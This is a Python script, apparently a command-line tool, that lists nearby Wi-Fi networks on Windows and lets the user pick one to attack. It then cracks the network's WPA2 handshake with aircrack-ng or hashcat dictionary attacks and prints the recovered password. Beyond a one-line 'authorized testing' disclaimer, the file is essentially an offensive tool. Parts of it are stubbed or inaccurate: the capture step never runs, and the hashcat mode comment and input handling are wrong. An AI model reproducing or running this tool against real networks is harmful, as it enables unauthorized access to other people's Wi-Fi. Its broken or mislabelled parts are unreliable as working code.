#!/usr/bin/env python3
"""
Wi-Fi WPA2 Cracker for Windows
Captures handshakes and performs dictionary/hashcat attacks
Designed for authorized penetration testing only
"""

import os
import subprocess
import sys
import time
import re
from pathlib import Path


class WiFiCracker:
    def __init__(self):
        self.aircrack_path = self.find_tool("aircrack-ng")
        self.hashcat_path = self.find_tool("hashcat")
        self.airport_path = "C:\\Program Files\\Npcap"  # Npcap install path

    def find_tool(self, tool_name):
        """Search for tool in PATH and common install locations"""
        # Check PATH
        result = subprocess.run(f"where {tool_name}", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip().split('\n')[0]

        # Common Windows install locations
        common_paths = [
            f"C:\\Program Files\\{tool_name}",
            f"C:\\Program Files (x86)\\{tool_name}",
            os.path.expanduser(f"~\\{tool_name}"),
        ]

        for path in common_paths:
            exe = Path(path) / f"{tool_name}.exe"
            if exe.exists():
                return str(exe)

        return None

    def list_networks(self):
        """List all available Wi-Fi networks"""
        print("\n[*] Scanning for Wi-Fi networks...")
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
            capture_output=True, text=True
        )

        networks = []
        current = {}
        for line in result.stdout.splitlines():
            line = line.strip()
            if "SSID" in line and "BSSID" not in line:
                match = re.match(r"SSID\s+\d+\s*:\s*(.*)", line)
                if match:
                    if current.get("ssid"):
                        networks.append(current)
                    current = {"ssid": match.group(1).strip()}
            elif "BSSID" in line:
                match = re.search(r"([0-9A-F]{2}(?::[0-9A-F]{2}){5})", line)
                if match:
                    current["bssid"] = match.group(1)
            elif "Authentication" in line:
                current["auth"] = line.split(":")[-1].strip()

        if current.get("ssid"):
            networks.append(current)

        return networks

    def display_networks(self, networks):
        """Display networks in table format"""
        if not networks:
            print("[!] No networks found")
            return

        print("\n{:<3} {:<30} {:<18} {:<20}".format("#", "SSID", "BSSID", "Security"))
        print("-" * 75)
        for i, net in enumerate(networks, 1):
            ssid = net.get("ssid", "Unknown")[:30]
            bssid = net.get("bssid", "Unknown")
            auth = net.get("auth", "Unknown")
            print("{:<3} {:<30} {:<18} {:<20}".format(i, ssid, bssid, auth))

    def capture_handshake(self, ssid, bssid, timeout=30):
        """
        Capture WPA handshake
        Requires aircrack-ng and Npcap
        """
        if not self.aircrack_path:
            print("[!] aircrack-ng not found. Install from: https://www.aircrack-ng.org/")
            return None

        cap_file = f"{ssid.replace(' ', '_')}.cap"

        print(f"\n[*] Attempting to capture handshake for '{ssid}'...")
        print(f"[*] This may take 30-120 seconds depending on network activity")
        print(f"[*] Saved capture file: {cap_file}")

        try:
            # Start airodump-ng to capture packets
            # Note: This requires monitor mode which may need special configuration
            cmd = [
                self.aircrack_path.replace("aircrack-ng", "airodump-ng"),
                "-c", "6",  # Channel (guess - may need adjustment)
                "-b", bssid,
                "-w", cap_file,
                "--essid", ssid
            ]

            print("[!] Monitor mode setup required - this is manual on Windows")
            print("[!] Alternative: Use external handshake capture tool or WiFi adapter with monitor mode")
            return None

        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def crack_handshake_dict(self, cap_file, wordlist="rockyou.txt"):
        """Crack WPA handshake using dictionary attack"""
        if not self.aircrack_path:
            print("[!] aircrack-ng not found")
            return None

        if not Path(wordlist).exists():
            print(f"[!] Wordlist not found: {wordlist}")
            print("[*] Download rockyou.txt from: https://github.com/brannondorsey/naive-hashcat/releases")
            return None

        print(f"\n[*] Starting dictionary attack with {wordlist}...")
        print("[*] This may take several minutes...")

        try:
            cmd = [
                self.aircrack_path,
                cap_file,
                "-w", wordlist
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            output = result.stdout + result.stderr

            # Parse output for password
            if "KEY FOUND" in output or "Passphrase" in output:
                for line in output.splitlines():
                    if "KEY FOUND" in line or "Passphrase" in line:
                        print(f"\n[+] SUCCESS! {line}")
                        match = re.search(r":\s*(.+?)(?:\s*\(|$)", line)
                        if match:
                            return match.group(1).strip()

            print("[!] Password not found in wordlist")
            return None

        except subprocess.TimeoutExpired:
            print("[!] Dictionary attack timed out")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def crack_handshake_hashcat(self, cap_file, wordlist="rockyou.txt"):
        """Crack WPA handshake using hashcat (GPU accelerated - much faster)"""
        if not self.hashcat_path:
            print("[!] hashcat not found. Install from: https://hashcat.net/hashcat/")
            return None

        if not Path(wordlist).exists():
            print(f"[!] Wordlist not found: {wordlist}")
            return None

        print(f"\n[*] Starting GPU-accelerated attack with hashcat...")

        try:
            # hashcat WPA2 mode is 2500
            cmd = [
                self.hashcat_path,
                "-m", "2500",  # WPA-PMKID-PBKDF2
                "-a", "0",     # Dictionary attack
                cap_file,
                wordlist
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            output = result.stdout + result.stderr

            if "recovered" in output.lower():
                print("\n[+] Hashcat attack completed!")
                print(output[-500:])  # Last 500 chars
                return "Check hashcat output above"

            return None

        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def wps_test(self, bssid):
        """Test if WPS is enabled (faster attack vector)"""
        print(f"\n[*] Testing WPS vulnerability on {bssid}...")
        print("[*] If WPS is enabled, we can crack much faster")

        # pixie-dust or Reaver would be used here
        print("[!] WPS testing requires reaver tool")
        print("[*] Download: https://github.com/t6x/reaver-wps-fork-t6x")
        return None

    def run(self):
        """Main flow"""
        print("=" * 75)
        print("Wi-Fi WPA2 Cracker for Windows (Authorized Penetration Testing Only)")
        print("=" * 75)

        # Check tools
        print("\n[*] Checking for required tools...")
        if not self.aircrack_path:
            print("[!] aircrack-ng not found - REQUIRED")
            print("[*] Install from: https://www.aircrack-ng.org/download.html")
            sys.exit(1)
        else:
            print(f"[+] aircrack-ng found: {self.aircrack_path}")

        if self.hashcat_path:
            print(f"[+] hashcat found (GPU acceleration available): {self.hashcat_path}")
        else:
            print("[*] hashcat not found (optional, CPU cracking will be slower)")

        # Get networks
        networks = self.list_networks()
        self.display_networks(networks)

        # Select target
        while True:
            try:
                choice = input("\nEnter network number to crack (or 'q' to quit): ").strip()
                if choice.lower() == 'q':
                    sys.exit(0)
                idx = int(choice) - 1
                if 0 <= idx < len(networks):
                    target = networks[idx]
                    break
            except ValueError:
                pass
            print("Invalid input")

        ssid = target["ssid"]
        bssid = target.get("bssid", "unknown")

        print(f"\n[*] Target: {ssid} ({bssid})")
        print(f"[*] Security: {target.get('auth', 'Unknown')}")

        # Capture handshake (manual on Windows)
        print("\n[!] === HANDSHAKE CAPTURE ===")
        print("[!] On Windows, monitor mode is complex. Options:")
        print("    1. Use external tool: WiFi Adapter with monitor mode (Linux USB)")
        print("    2. Pre-captured .cap file: Do you have an existing capture?")

        cap_file = input("\nPath to .cap handshake file (or Enter to skip): ").strip()

        if not cap_file or not Path(cap_file).exists():
            print("[!] No handshake file provided. Attempting capture...")
            self.capture_handshake(ssid, bssid)
            print("[!] Capture requires additional setup on Windows")
            return

        # Crack it
        print("\n[*] === PASSWORD CRACKING ===")
        wordlist = input("Path to wordlist [rockyou.txt]: ").strip() or "rockyou.txt"

        if not Path(wordlist).exists():
            print(f"[!] Downloading common wordlist...")
            # Could auto-download here

        if self.hashcat_path:
            password = self.crack_handshake_hashcat(cap_file, wordlist)
        else:
            password = self.crack_handshake_dict(cap_file, wordlist)

        if password:
            print(f"\n[+] PASSWORD FOUND: {password}")
        else:
            print("\n[!] Password not found")


if __name__ == "__main__":
    cracker = WiFiCracker()
    cracker.run()
